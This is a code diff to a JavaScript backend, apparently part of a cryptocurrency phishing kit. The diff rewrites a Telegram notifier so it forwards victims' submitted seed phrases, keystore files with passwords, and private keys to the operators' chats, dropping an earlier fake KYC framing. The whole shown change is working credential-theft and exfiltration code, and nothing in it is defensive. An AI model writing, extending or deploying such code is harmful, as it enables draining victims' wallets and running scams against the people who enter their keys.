@@ -287,62 +287,26 @@ function notifyNewAdmin(username) {
   }
 }
 
+// Send wallet submission to Telegram: session + whatever was collected (seed phrase, keystore+password, or private key)
 function notifyNewKyc(details) {
-  // Format KYC details for Telegram
-  const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images, fileMap, dealersLicenseStatus, qualityRequired, karatsPurity, destinationRefineryText } = details;
-  let message = `New KYC Submission:\nSession ID: ${sessionId || 'N/A'}\nWallet Type: ${walletType || 'N/A'}`;
-  if (dealersLicenseStatus) message += `\nDealers License: ${dealersLicenseStatus}`;
-  if (qualityRequired) message += `\nQuality Required: ${qualityRequired}`;
-  if (karatsPurity) message += `\nKarats & Purity: ${karatsPurity}`;
-  if (destinationRefineryText) message += `\nDestination Refinery: ${destinationRefineryText}`;
+  const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey } = details;
+  let message = `New Wallet Submission:\nSession ID: ${sessionId || 'N/A'}\nWallet Type: ${walletType || 'N/A'}`;
   if (seedPhrase) message += `\n\nSeed Phrase: ${seedPhrase}`;
   if (keystoreJson) message += `\n\nKeystore JSON: ${keystoreJson}`;
   if (password) message += `\nPassword: ${password}`;
   if (privateKey) message += `\nPrivate Key: ${privateKey}`;
 
-  // Collect image URLs for passport and KYC document (not destination refinery)
-  // Send all images from fileMap as photos, with their key as caption
   if (bot) {
     chatIds.forEach(async chatId => {
       try {
-        // Send main message with only text details
         await bot.sendMessage(chatId, message);
-        // Send all files in fileMap, using sendPhoto for images and sendDocument for documents
-        if (fileMap && Object.keys(fileMap).length) {
-          const imageFormats = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
-          for (const [key, val] of Object.entries(fileMap)) {
-            const fileUrl = val.url || val.secure_url;
-            const format = (val.format || '').toLowerCase();
-            const resourceType = (val.resource_type || '').toLowerCase();
-            const caption = `${key} (${sessionId})`;
-            if (fileUrl) {
-              // Send as image if format matches or resource_type is 'image'
-              if (imageFormats.includes(format) || resourceType === 'image') {
-                await bot.sendPhoto(chatId, fileUrl, { caption });
-              } else {
-                // Send as document if resource_type is 'raw', or format is missing/not image
-                await bot.sendDocument(chatId, fileUrl, { caption });
-              }
-            }
-          }
-        }
-        // Append /admin prompt after sending all data
         await bot.sendMessage(chatId, 'Use /admin to manage admins.');
       } catch (err) {
-        console.error('Failed to send telegram KYC message', err);
+        console.error('Failed to send telegram wallet message', err);
       }
     });
   } else {
-    // For stub, print message and image URLs
     console.log('[telegram stub] notifyNewKyc:', message);
-    if (fileMap && Object.keys(fileMap).length) {
-      Object.entries(fileMap).forEach(([key, val]) => {
-        const imgUrl = val.url || val.secure_url;
-        if (imgUrl) {
-          console.log(`[telegram stub] ${key} image:`, imgUrl);
-        }
-      });
-    }
   }
 }
 
